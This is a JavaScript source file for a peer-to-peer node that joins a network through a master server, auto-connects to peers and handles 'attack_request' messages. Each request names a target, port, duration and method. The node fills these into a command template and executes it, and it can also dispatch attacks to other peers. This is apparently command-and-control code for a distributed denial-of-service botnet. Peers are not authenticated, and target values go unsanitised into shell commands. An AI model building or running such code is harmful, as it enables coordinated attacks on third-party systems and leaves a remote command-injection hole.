import EventEmitter from 'events';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';

/**
 * P2P Hybrid System
 * - Node dapat berkomunikasi langsung (P2P) atau lewat master (relay)
 * - Auto-discovery lewat master
 * - Fallback ke relay jika P2P gagal
 * - Mendukung enkripsi end-to-end
 */

class P2PHybridNode extends EventEmitter {
  constructor(config, executor, methodsConfig) {
    super();
    
    this.config = config;
    this.executor = executor;
    this.methodsConfig = methodsConfig || {};
    this.nodeId = config.NODE.ID;
    
    // Peer connections
    this.peers = new Map(); // nodeId -> { ws, info, lastSeen, direct }
    this.pendingConnections = new Map(); // nodeId -> timeout
    
    // Discovery
    this.knownPeers = new Map(); // nodeId -> { ip, port, capabilities, lastUpdate }
    
    // WebSocket server untuk menerima P2P connections
    this.wss = null;
    
    // Stats
    this.stats = {
      directConnections: 0,
      relayedConnections: 0,
      messagesReceived: 0,
      messagesSent: 0,
      peersDiscovered: 0
    };
    
    // Configuration
    this.p2pConfig = {
      enabled: config.P2P?.ENABLED !== false,
      discoveryInterval: config.P2P?.DISCOVERY_INTERVAL || 60000, // 1 minute
      peerTimeout: config.P2P?.PEER_TIMEOUT || 180000, // 3 minutes
      maxPeers: config.P2P?.MAX_PEERS || 50,
      autoConnect: config.P2P?.AUTO_CONNECT !== false,
      relayFallback: config.P2P?.RELAY_FALLBACK !== false,
      heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000
    };
    
    // Encryption
    this.encryptionManager = null;
    
    // Discovery interval
    this.discoveryInterval = null;
    this.peerCleanupInterval = null;
    this.heartbeatInterval = null;
    
    // Shutdown flag
    this.isShuttingDown = false;
    
    console.log('[P2P] P2P Hybrid Node initialized', {
      nodeId: this.nodeId,
      enabled: this.p2pConfig.enabled
    });
  }
  
  /**
   * Set encryption manager
   */
  setEncryptionManager(manager) {
    this.encryptionManager = manager;
    console.log('[P2P] Encryption manager set');
  }
  
  /**
   * Start P2P server on the same port (using existing fastify server)
   */
  async startP2PServer(fastifyServer) {
    if (!this.p2pConfig.enabled) {
      console.log('[P2P] P2P is disabled');
      return false;
    }
    
    try {
      // Create WebSocket server attached to Fastify
      this.wss = new WebSocketServer({ 
        noServer: true,
        clientTracking: true
      });
      
      // Handle upgrade from HTTP to WebSocket
      fastifyServer.server.on('upgrade', (request, socket, head) => {
        const pathname = new URL(request.url, 'ws://localhost').pathname;
        
        // Check if this is a P2P connection
        if (pathname === '/p2p') {
          console.log('[P2P-SERVER] Incoming P2P connection request');
          
          this.wss.handleUpgrade(request, socket, head, (ws) => {
            this.wss.emit('connection', ws, request);
          });
        }
        // Otherwise, let other handlers deal with it
      });
      
      // Handle new P2P connections
      this.wss.on('connection', (ws, request) => {
        this.handleIncomingPeerConnection(ws, request);
      });
      
      console.log(`[P2P-SERVER] P2P server started on port ${this.config.SERVER.PORT}`);
      
      // Start discovery
      this.startPeerDiscovery();
      
      // Start peer cleanup
      this.startPeerCleanup();
      
      // Start peer heartbeat
      this.startPeerHeartbeat();
      
      return true;
      
    } catch (error) {
      console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
      return false;
    }
  }
  
  /**
   * Handle incoming peer connection
   */
  handleIncomingPeerConnection(ws, request) {
    const remoteNodeId = request.headers['x-node-id'];
    const remoteIp = request.headers['x-forwarded-for'] || request.socket.remoteAddress;
    
    console.log('[P2P-SERVER] New peer connection:', {
      remoteNodeId,
      remoteIp
    });
    
    if (!remoteNodeId) {
      console.log('[P2P-SERVER] Rejected: Missing node ID');
      ws.close(4000, 'Missing node ID');
      return;
    }
    
    if (remoteNodeId === this.nodeId) {
      console.log('[P2P-SERVER] Rejected: Self-connection attempt');
      ws.close(4001, 'Cannot connect to self');
      return;
    }
    
    // Check if we already have this peer
    if (this.peers.has(remoteNodeId)) {
      console.log('[P2P-SERVER] Peer already connected, closing old connection');
      const oldPeer = this.peers.get(remoteNodeId);
      try {
        oldPeer.ws.close();
      } catch (e) {
        // ignore
      }
    }
    
    // Store peer connection
    const peerInfo = {
      ws,
      nodeId: remoteNodeId,
      ip: remoteIp,
      connected: true,
      direct: true,
      lastSeen: Date.now(),
      lastHeartbeat: Date.now(),
      messagesReceived: 0,
      messagesSent: 0
    };
    
    this.peers.set(remoteNodeId, peerInfo);
    this.stats.directConnections++;
    
    // Send welcome message
    this.sendToPeer(remoteNodeId, {
      type: 'welcome',
      nodeId: this.nodeId,
      timestamp: Date.now(),
      capabilities: {
        encryption: !!this.encryptionManager,
        methods: Object.keys(this.methodsConfig)
      }
    });
    
    // Setup event handlers
    ws.on('message', (data) => {
      this.handlePeerMessage(remoteNodeId, data);
    });
    
    ws.on('close', () => {
      console.log(`[P2P] Peer ${remoteNodeId} disconnected`);
      this.peers.delete(remoteNodeId);
      this.emit('peer_disconnected', { nodeId: remoteNodeId });
    });
    
    ws.on('error', (error) => {
      console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
    });
    
    ws.on('pong', () => {
      if (this.peers.has(remoteNodeId)) {
        this.peers.get(remoteNodeId).lastSeen = Date.now();
      }
    });
    
    this.emit('peer_connected', {
      nodeId: remoteNodeId,
      ip: remoteIp,
      direct: true
    });
    
    console.log(`[P2P] Peer ${remoteNodeId} connected (direct)`);
  }
  
  /**
   * Connect to a peer directly
   */
  async connectToPeer(nodeId, peerInfo) {
    if (nodeId === this.nodeId) {
      return { success: false, error: 'Cannot connect to self' };
    }
    
    if (this.peers.has(nodeId)) {
      return { success: true, existing: true };
    }
    
    if (!peerInfo.ip || !peerInfo.port) {
      return { success: false, error: 'Missing peer IP or port' };
    }
    
    try {
      const wsUrl = `ws://${peerInfo.ip}:${peerInfo.port}/p2p`;
      
      console.log(`[P2P] Connecting to peer ${nodeId} at ${wsUrl}`);
      
      const ws = new WebSocket(wsUrl, {
        headers: {
          'X-Node-ID': this.nodeId,
          'X-Node-IP': this.config.NODE.IP || 'unknown'
        },
        handshakeTimeout: 10000
      });
      
      return new Promise((resolve) => {
        const timeout = setTimeout(() => {
          ws.close();
          resolve({ success: false, error: 'Connection timeout' });
        }, 10000);
        
        ws.on('open', () => {
          clearTimeout(timeout);
          
          // Store peer
          const peer = {
            ws,
            nodeId,
            ip: peerInfo.ip,
            port: peerInfo.port,
            connected: true,
            direct: true,
            lastSeen: Date.now(),
            lastHeartbeat: Date.now(),
            messagesReceived: 0,
            messagesSent: 0
          };
          
          this.peers.set(nodeId, peer);
          this.stats.directConnections++;
          
          // Setup handlers
          ws.on('message', (data) => {
            this.handlePeerMessage(nodeId, data);
          });
          
          ws.on('close', () => {
            console.log(`[P2P] Peer ${nodeId} disconnected`);
            this.peers.delete(nodeId);
            this.emit('peer_disconnected', { nodeId });
          });
          
          ws.on('error', (error) => {
            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
          });
          
          ws.on('pong', () => {
            if (this.peers.has(nodeId)) {
              this.peers.get(nodeId).lastSeen = Date.now();
            }
          });
          
          this.emit('peer_connected', {
            nodeId,
            ip: peerInfo.ip,
            port: peerInfo.port,
            direct: true
          });
          
          console.log(`[P2P] Connected to peer ${nodeId} (direct)`);
          resolve({ success: true, direct: true });
        });
        
        ws.on('error', (error) => {
          clearTimeout(timeout);
          console.log(`[P2P] Failed to connect to ${nodeId}:`, error.message);
          resolve({ success: false, error: error.message });
        });
      });
      
    } catch (error) {
      console.error(`[P2P] Connection error to ${nodeId}:`, error.message);
      return { success: false, error: error.message };
    }
  }
  
  /**
   * Handle message from peer
   */
  handlePeerMessage(nodeId, data) {
    try {
      const message = JSON.parse(data.toString());
      
      // Update last seen
      if (this.peers.has(nodeId)) {
        this.peers.get(nodeId).lastSeen = Date.now();
        this.peers.get(nodeId).messagesReceived++;
      }
      
      this.stats.messagesReceived++;
      
      console.log(`[P2P] Message from ${nodeId}:`, message.type);
      
      // Handle different message types
      switch (message.type) {
        case 'welcome':
          console.log(`[P2P] Received welcome from ${nodeId}`);
          this.emit('peer_info', {
            nodeId,
            capabilities: message.capabilities
          });
          break;
          
        case 'ping':
          this.sendToPeer(nodeId, { type: 'pong', timestamp: Date.now() });
          break;
          
        case 'pong':
          if (this.peers.has(nodeId)) {
            this.peers.get(nodeId).lastHeartbeat = Date.now();
          }
          break;
          
        case 'attack_request':
          this.handleAttackRequest(nodeId, message);
          break;
          
        case 'attack_response':
          this.emit('attack_response', {
            nodeId,
            ...message
          });
          break;
          
        case 'status_request':
          this.handleStatusRequest(nodeId, message);
          break;
          
        case 'status_response':
          this.emit('status_response', {
            nodeId,
            ...message
          });
          break;
          
        case 'peer_list':
          this.handlePeerListUpdate(message);
          break;
          
        default:
          console.log(`[P2P] Unknown message type: ${message.type}`);
          this.emit('peer_message', {
            nodeId,
            message
          });
      }
      
    } catch (error) {
      console.error(`[P2P] Failed to handle message from ${nodeId}:`, error.message);
    }
  }
  
  /**
   * Handle attack request from peer
   */
  async handleAttackRequest(nodeId, message) {
    const { requestId, target, time, port, methods } = message;
    
    console.log(`[P2P] Attack request from ${nodeId}:`, {
      target,
      time,
      methods
    });
    
    try {
      // Validate method
      if (!this.methodsConfig[methods]) {
        this.sendToPeer(nodeId, {
          type: 'attack_response',
          requestId,
          success: false,
          error: 'INVALID_METHOD'
        });
        return;
      }
      
      // Build command
      const methodCfg = this.methodsConfig[methods];
      const command = methodCfg.cmd
        .replaceAll('{target}', target)
        .replaceAll('{time}', time)
        .replaceAll('{port}', port);
      
      // Execute
      const result = await this.executor.execute(command, {
        expectedDuration: time
      });
      
      // Send response
      this.sendToPeer(nodeId, {
        type: 'attack_response',
        requestId,
        success: true,
        processId: result.processId,
        pid: result.pid,
        target,
        time,
        port,
        methods
      });
      
    } catch (error) {
      this.sendToPeer(nodeId, {
        type: 'attack_response',
        requestId,
        success: false,
        error: error.message
      });
    }
  }
  
  /**
   * Handle status request from peer
   */
  async handleStatusRequest(nodeId, message) {
    const { requestId } = message;
    
    try {
      const activeProcesses = this.executor.getActiveProcesses();
      
      const status = {
        nodeId: this.nodeId,
        activeProcesses: activeProcesses.length,
        methods: Object.keys(this.methodsConfig),
        peers: this.peers.size,
        uptime: process.uptime(),
        timestamp: Date.now()
      };
      
      this.sendToPeer(nodeId, {
        type: 'status_response',
        requestId,
        status
      });
      
    } catch (error) {
      this.sendToPeer(nodeId, {
        type: 'status_response',
        requestId,
        error: error.message
      });
    }
  }
  
  /**
   * Handle peer list update from discovery
   */
  handlePeerListUpdate(message) {
    const { peers } = message;
    
    if (!Array.isArray(peers)) {
      return;
    }
    
    console.log(`[P2P] Received peer list: ${peers.length} peers`);
    
    let newPeers = 0;
    
    for (const peer of peers) {
      if (!peer.node_id || peer.node_id === this.nodeId) {
        continue;
      }
      
      const existing = this.knownPeers.get(peer.node_id);
      
      if (!existing) {
        newPeers++;
        this.stats.peersDiscovered++;
      }
      
      this.knownPeers.set(peer.node_id, {
        nodeId: peer.node_id,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        methods: peer.methods_supported || [],
        lastUpdate: Date.now()
      });
    }
    
    if (newPeers > 0) {
      console.log(`[P2P] Discovered ${newPeers} new peers`);
      
      // Auto-connect to new reachable peers
      if (this.p2pConfig.autoConnect) {
        this.autoConnectToPeers();
      }
    }
  }
  
  /**
   * Send message to peer
   */
  sendToPeer(nodeId, message) {
    const peer = this.peers.get(nodeId);
    
    if (!peer || !peer.connected) {
      console.log(`[P2P] Peer ${nodeId} not connected, cannot send message`);
      return false;
    }
    
    try {
      if (peer.ws.readyState === WebSocket.OPEN) {
        peer.ws.send(JSON.stringify(message));
        peer.messagesSent++;
        this.stats.messagesSent++;
        return true;
      } else {
        console.log(`[P2P] Peer ${nodeId} WebSocket not open`);
        return false;
      }
    } catch (error) {
      console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
      return false;
    }
  }
  
  /**
   * Broadcast message to all peers
   */
  broadcastToPeers(message, excludeNodeId = null) {
    let sent = 0;
    
    for (const [nodeId, peer] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) {
        continue;
      }
      
      if (this.sendToPeer(nodeId, message)) {
        sent++;
      }
    }
    
    return sent;
  }
  
  /**
   * Request attack from peer
   */
  async requestAttackFromPeer(nodeId, target, time, port, methods) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        this.removeAllListeners(`attack_response_${requestId}`);
        resolve({ success: false, error: 'Timeout' });
      }, 30000);
      
      const handler = (data) => {
        if (data.requestId === requestId) {
          clearTimeout(timeout);
          this.removeListener('attack_response', handler);
          resolve(data);
        }
      };
      
      this.on('attack_response', handler);
      
      this.sendToPeer(nodeId, {
        type: 'attack_request',
        requestId,
        target,
        time,
        port,
        methods
      });
    });
  }
  
  /**
   * Request status from peer
   */
  async requestStatusFromPeer(nodeId) {
    const requestId = crypto.randomBytes(8).toString('hex');
    
    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        this.removeAllListeners(`status_response_${requestId}`);
        resolve({ success: false, error: 'Timeout' });
      }, 10000);
      
      const handler = (data) => {
        if (data.requestId === requestId) {
          clearTimeout(timeout);
          this.removeListener('status_response', handler);
          resolve(data);
        }
      };
      
      this.on('status_response', handler);
      
      this.sendToPeer(nodeId, {
        type: 'status_request',
        requestId
      });
    });
  }
  
  /**
   * Start peer discovery from master
   */
  startPeerDiscovery() {
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
    }
    
    console.log(`[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`);
    
    // Initial discovery
    setTimeout(() => this.discoverPeers(), 5000);
    
    // Periodic discovery
    this.discoveryInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this.discoverPeers();
      }
    }, this.p2pConfig.discoveryInterval);
  }
  
  /**
   * Discover peers from master
   */
  async discoverPeers() {
    if (!this.config.MASTER?.URL) {
      return;
    }
    
    try {
      console.log('[P2P-DISCOVERY] Requesting peer list from master...');
      
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);
      
      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/nodes`, {
        signal: controller.signal
      });
      
      clearTimeout(timeout);
      
      if (!response.ok) {
        console.log('[P2P-DISCOVERY] Failed to get peer list:', response.status);
        return;
      }
      
      const data = await response.json();
      
      if (data.nodes && Array.isArray(data.nodes)) {
        this.handlePeerListUpdate({ peers: data.nodes });
      }
      
    } catch (error) {
      console.error('[P2P-DISCOVERY] Error:', error.message);
    }
  }
  
  /**
   * Auto-connect to reachable peers
   */
  async autoConnectToPeers() {
    if (this.peers.size >= this.p2pConfig.maxPeers) {
      console.log('[P2P] Max peers reached, skipping auto-connect');
      return;
    }
    
    const reachablePeers = Array.from(this.knownPeers.values())
      .filter(peer => 
        peer.reachable && 
        peer.mode === 'DIRECT' && 
        !this.peers.has(peer.nodeId)
      )
      .slice(0, this.p2pConfig.maxPeers - this.peers.size);
    
    if (reachablePeers.length === 0) {
      return;
    }
    
    console.log(`[P2P] Auto-connecting to ${reachablePeers.length} reachable peers...`);
    
    for (const peer of reachablePeers) {
      if (this.isShuttingDown) break;
      
      try {
        await this.connectToPeer(peer.nodeId, peer);
        await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limit
      } catch (error) {
        console.error(`[P2P] Failed to connect to ${peer.nodeId}:`, error.message);
      }
    }
  }
  
  /**
   * Start peer cleanup (remove stale peers)
   */
  startPeerCleanup() {
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
    }
    
    this.peerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      const now = Date.now();
      const timeout = this.p2pConfig.peerTimeout;
      
      // Cleanup stale known peers
      for (const [nodeId, peer] of this.knownPeers) {
        if (now - peer.lastUpdate > timeout * 2) {
          this.knownPeers.delete(nodeId);
          console.log(`[P2P-CLEANUP] Removed stale peer info: ${nodeId}`);
        }
      }
      
      // Cleanup stale connections
      for (const [nodeId, peer] of this.peers) {
        if (now - peer.lastSeen > timeout) {
          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
          try {
            peer.ws.close();
          } catch (e) {
            // ignore
          }
          this.peers.delete(nodeId);
        }
      }
      
    }, 60000); // Every minute
    
    console.log('[P2P-CLEANUP] Peer cleanup started');
  }
  
  /**
   * Start peer heartbeat
   */
  startPeerHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    
    this.heartbeatInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      for (const [nodeId, peer] of this.peers) {
        try {
          if (peer.ws.readyState === WebSocket.OPEN) {
            peer.ws.ping();
            this.sendToPeer(nodeId, {
              type: 'ping',
              timestamp: Date.now()
            });
          }
        } catch (error) {
          console.error(`[P2P-HEARTBEAT] Error pinging ${nodeId}:`, error.message);
        }
      }
      
    }, this.p2pConfig.heartbeatInterval);
    
    console.log(`[P2P-HEARTBEAT] Peer heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`);
  }
  
  /**
   * Get P2P status
   */
  getStatus() {
    return {
      enabled: this.p2pConfig.enabled,
      nodeId: this.nodeId,
      peers: {
        connected: this.peers.size,
        known: this.knownPeers.size,
        max: this.p2pConfig.maxPeers
      },
      stats: { ...this.stats },
      connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
        nodeId,
        ip: peer.ip,
        direct: peer.direct,
        lastSeen: peer.lastSeen,
        messagesReceived: peer.messagesReceived,
        messagesSent: peer.messagesSent
      })),
      knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        connected: this.peers.has(peer.nodeId)
      }))
    };
  }
  
  /**
   * Shutdown P2P node
   */
  shutdown() {
    console.log('[P2P] Shutting down P2P node...');
    this.isShuttingDown = true;
    
    // Clear intervals
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
      this.discoveryInterval = null;
    }
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
      this.peerCleanupInterval = null;
    }
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
    
    // Close all peer connections
    for (const [nodeId, peer] of this.peers) {
      try {
        this.sendToPeer(nodeId, {
          type: 'goodbye',
          nodeId: this.nodeId,
          timestamp: Date.now()
        });
        peer.ws.close();
      } catch (e) {
        // ignore
      }
    }
    
    this.peers.clear();
    
    // Close server
    if (this.wss) {
      this.wss.close(() => {
        console.log('[P2P] WebSocket server closed');
      });
    }
    
    this.removeAllListeners();
    
    console.log('[P2P] P2P node shutdown complete');
  }
}

export default P2PHybridNode;
